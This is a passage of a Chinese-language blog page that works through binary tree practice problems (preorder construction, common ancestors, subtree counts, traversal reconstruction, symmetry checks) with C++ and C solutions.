class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树遍历">二叉树遍历</h3><h5 id="题目描述-15">题目描述</h5><p>编一个程序，读入用户输入的一串先序遍历字符串，根据此字符串建立一个二叉树（以指针方式存储）。例如如下的先序遍历字符串： ABC##DE#G##F###其中“#”表示的是空格，空格字符代表空树。建立起此二叉树以后，再对二叉树进行中序遍历，输出遍历结果</p><h5 id="输入输出格式-13">输入输出格式</h5><h6 id="输入描述-15">输入描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入包括1行字符串，长度不超过100。</span><br></pre></td></tr></table></figure><h6 id="输出描述-15">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，</span><br><span class="line">输出将输入字符串建立二叉树后中序遍历的序列，每个字符后面都有一个空格。</span><br><span class="line">每个输出结果占一行。</span><br></pre></td></tr></table></figure><p>注意create的时候，new出来的tree空间是在堆上，和栈一样要初始化（但我也不知道为什么上一题不用也可以），总之初始化一定不会有问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125; *Tree;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line">string s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">create</span><span class="params">(Tree &amp;T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(idx &gt;= s.<span class="built_in">size</span>()) <span class="keyword">return</span>;</span><br><span class="line"><span class="type">char</span> c = s[idx++];</span><br><span class="line"><span class="keyword">if</span>(c == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">T = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">T = <span class="keyword">new</span> node;</span><br><span class="line">T-&gt;c = c;</span><br><span class="line">T-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">T-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">create</span>(T-&gt;l);</span><br><span class="line"><span class="built_in">create</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InOrderTraverse</span><span class="params">(Tree T)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;l);</span><br><span class="line">cout &lt;&lt; T-&gt;c &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(T-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line">Tree root;</span><br><span class="line"><span class="built_in">create</span>(root);</span><br><span class="line"><span class="built_in">InOrderTraverse</span>(root);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树-1">二叉树</h3><h5 id="题目描述-16">题目描述</h5><pre><code>1  /2   3/ \ /</code></pre><p>4 5 6 7 / / / / 如上图所示，由正整数 1, 2, 3,...组成了一棵无限大的二叉树。从某一个结点到根结点（编号是1的结点）都有一条唯一的路径，比如从5到根结点的路径是（5,2, 1），从4到根结点的路径是（4, 2,1），从根结点1到根结点的路径上只包含一个结点1，因此路径就是（1）。对于两个结点x和y，假设他们到根结点的路径分别是（x1,x2, ... ,1）和（y1, y2,...,1），那么必然存在两个正整数i和j，使得从xi和yj 开始，有xi = yj，xi + 1 = yj + 1，xi + 2 = yj + 2，...现在的问题就是，给定x和y，要求他们的公共父节点，即xi（也就是 yj）。</p><h5 id="输入输出格式-14">输入输出格式</h5><h6 id="输入描述-16">输入描述:</h6><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入包含多组数据，每组数据包含两个正整数<span class="keyword">x</span>和y（<span class="number">1</span>≤<span class="keyword">x</span><span class="punctuation">,</span> y≤<span class="number">2</span>^<span class="number">31</span><span class="number">-1</span>）。</span><br></pre></td></tr></table></figure><h6 id="输出描述-16">输出描述:</h6><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对应每一组数据，输出一个正整数<span class="keyword">xi</span>，即它们的首个公共父节点。</span><br></pre></td></tr></table></figure><p>利用完全二叉树的特性，父节点 =子节点/2</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line"><span class="keyword">while</span>(x!=y)&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line">x /=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">y /= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树2">二叉树2</h3><h5 id="题目描述-17">题目描述</h5><p><img src="https://noobdream.com/media/upload/2019/10/24/39_1429598902788_btree.jpg"></p><pre><code>如上所示，由正整数1，2，3……组成了一颗特殊二叉树。我们已知这个二叉树的最后一个结点是n。现在的问题是，结点m所在的子树中一共包括多少个结点。     比如，n = 12，m = 3那么上图中的结点13，14，15以及后面的结点都是不存在的，结点m所在子树中包括的结点有3，6，7，12，因此结点m的所在子树中共有4个结点。</code></pre><h5 id="输入输出格式-15">输入输出格式</h5><h6 id="输入描述-17">输入描述:</h6><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入数据包括多行，每行给出一组测试数据，包括两个整数m，n (<span class="number">1</span> &lt;<span class="operator">=</span> m &lt;<span class="operator">=</span> n &lt;<span class="operator">=</span> <span class="number">1000000000</span>)。</span><br></pre></td></tr></table></figure><h6 id="输出描述-17">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于每一组测试数据，输出一行，该行包含一个整数，给出结点m所在子树中包括的结点的数目。</span><br></pre></td></tr></table></figure><p>直接递归</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">cal</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x &gt; y)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">ans += <span class="number">1</span>;</span><br><span class="line"><span class="built_in">cal</span>(x*<span class="number">2</span>, y);</span><br><span class="line"><span class="built_in">cal</span>(x*<span class="number">2</span>+<span class="number">1</span>, y);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">ans = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">cal</span>(x, y);</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二叉树遍历2">二叉树遍历2</h3><h5 id="题目描述-18">题目描述</h5><p>二叉树的前序、中序、后序遍历的定义：前序遍历：对任一子树，先访问跟，然后遍历其左子树，最后遍历其右子树；中序遍历：对任一子树，先遍历其左子树，然后访问根，最后遍历其右子树；后序遍历：对任一子树，先遍历其左子树，然后遍历其右子树，最后访问根。给定一棵二叉树的前序遍历和中序遍历，求其后序遍历（提示：给定前序遍历与中序遍历能够唯一确定后序遍历）。</p><h5 id="输入输出格式-16">输入输出格式</h5><h6 id="输入描述-18">输入描述:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">两个字符串，其长度n均小于等于<span class="number">26</span>。</span><br><span class="line">第一行为前序遍历，第二行为中序遍历。</span><br><span class="line">二叉树中的结点名称以大写字母表示：<span class="selector-tag">A</span>，<span class="selector-tag">B</span>，C....最多<span class="number">26</span>个结点。</span><br></pre></td></tr></table></figure><h6 id="输出描述-18">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入样例可能有多组，对于每组测试样例，</span><br><span class="line">输出一行，为后序遍历的字符串。</span><br></pre></td></tr></table></figure><p>对前序来说，第一个永远是父节点；对中序来说，父节点将子节点分开。根据这个思路递归建树</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string pre, string mid, <span class="type">int</span> start, <span class="type">int</span> end)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(start &gt; end) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = start; i &lt;= end; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(pre[flag] == mid[i]) n = i;</span><br><span class="line">&#125;</span><br><span class="line">Tree t;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;c = pre[flag];</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">flag++;</span><br><span class="line">t-&gt;l = <span class="built_in">build</span>(pre, mid, start, n<span class="number">-1</span>);</span><br><span class="line">t-&gt;r = <span class="built_in">build</span>(pre, mid, n+<span class="number">1</span>, end);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PostOrderTraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t!=<span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(t-&gt;r);</span><br><span class="line">cout &lt;&lt; t-&gt;c;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string x, y;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; x &gt;&gt; y)&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> len = y.<span class="built_in">size</span>();</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="built_in">build</span>(x, y, <span class="number">0</span>, len<span class="number">-1</span>);</span><br><span class="line"><span class="built_in">PostOrderTraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="判断二叉树是否对称">判断二叉树是否对称</h3><h5 id="题目描述-19">题目描述</h5><p>层次遍历的方式输入一个二叉树，判断这个二叉树的结构（即不用管结点的值）是否镜像对称。</p><h5 id="输入输出格式-17">输入输出格式</h5><h6 id="输入描述-19">输入描述:</h6><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入一行字母，其中<span class="meta">#表示空节点（字母长度小于1000）。</span></span><br></pre></td></tr></table></figure><h6 id="输出描述-19">输出描述:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">如果输入的二叉树对称，输出<span class="keyword">YES</span>，否则输出<span class="keyword">NO</span>。</span><br></pre></td></tr></table></figure><p>先层次读入二叉树，方法是用队列，先进的节点先读取；然后递归判断是否对称，即使用左右节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line"><span class="type">char</span> c;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> *l, *r;</span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">Tree <span class="title">build</span><span class="params">(string s)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">queue&lt;Tree&gt; q;</span><br><span class="line">Tree root = <span class="keyword">new</span> node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[<span class="number">0</span>] != <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">root-&gt;c = s[x++];</span><br><span class="line">root-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">root-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line">q.<span class="built_in">push</span>(root);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">Tree rt = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">Tree l, r;</span><br><span class="line"><span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">l = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> node;</span><br><span class="line">l-&gt;c = s[x];</span><br><span class="line">q.<span class="built_in">push</span>(l);</span><br><span class="line">&#125;</span><br><span class="line">x++;</span><br><span class="line">rt-&gt;l = l;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(s[x] == <span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">r = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">r = <span class="keyword">new</span> node;</span><br><span class="line">r-&gt;c = s[x];</span><br><span class="line">q.<span class="built_in">push</span>(r);</span><br><span class="line">&#125;</span><br><span class="line">x++;</span><br><span class="line">rt-&gt;r = r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">judge</span><span class="params">(Tree l, Tree r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(l == <span class="literal">NULL</span> &amp;&amp; r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(l == <span class="literal">NULL</span> || r == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">judge</span>(l-&gt;l, r-&gt;r) &amp; <span class="built_in">judge</span>(l-&gt;r, r-&gt;l);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="built_in">build</span>(s);</span><br><span class="line">Tree l = root-&gt;l, r = root-&gt;r;</span><br><span class="line"><span class="type">bool</span> ans = <span class="built_in">judge</span>(l, r);</span><br><span class="line"><span class="keyword">if</span>(ans) cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line"><span class="keyword">else</span> cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看别人写的也有直接对字符串进行对称判断的。第0-0个是第一层，1-2是第二层，3-6是第三层...，即i-j，下一层就是2i+1——2j+2，然后就简单了。奕</p><p>！悟！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Judge</span><span class="params">(<span class="type">char</span> *s,<span class="type">int</span> start,<span class="type">int</span> end,<span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (end&gt;=len)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start,j=end; i&lt;=j; i++,j--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((s[i]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[j]!=<span class="string">&#x27;#&#x27;</span>)||(s[j]==<span class="string">&#x27;#&#x27;</span>&amp;&amp;s[i]!=<span class="string">&#x27;#&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Judge</span>(s,<span class="number">2</span>*start+<span class="number">1</span>,<span class="number">2</span>*end+<span class="number">2</span>,len);<span class="comment">//判断下一层</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">1000</span>];</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,<span class="built_in">Judge</span>(s,<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">strlen</span>(s))?<span class="string">&quot;YES&quot;</span>:<span class="string">&quot;NO&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//system(&quot;pause&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二叉排序树">二叉排序树</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>左子树的比根节点小，右子树比根节点大，左右子树也都是二叉排序树</p><h3 id="二叉排序树2">二叉排序树2</h3><h5 id="题目描述-20">题目描述</h5><p>输入一系列整数，建立二叉排序树，并进行前序，中序，后序遍历。</p><h5 id="输入输出格式-18">输入输出格式</h5><h6 id="输入描述-20">输入描述:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入第一行包括一个整数<span class="built_in">n</span>(<span class="comment">1&lt;=n&lt;=100</span>)。</span><br><span class="line">接下来的一行包括<span class="built_in">n</span>个整数。</span><br></pre></td></tr></table></figure><h6 id="输出描述-20">输出描述:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可能有多组测试数据，对于每组数据，将题目所给数据建立一个二叉排序树，并对二叉排序树进行前序、中序和后序遍历。</span><br><span class="line">每种遍历结果输出一行。每行最后一个数据之后有一个空格。</span><br><span class="line"></span><br><span class="line">输入中可能有重复元素，但是输出的二叉树遍历序列中重复元素不用输出。</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 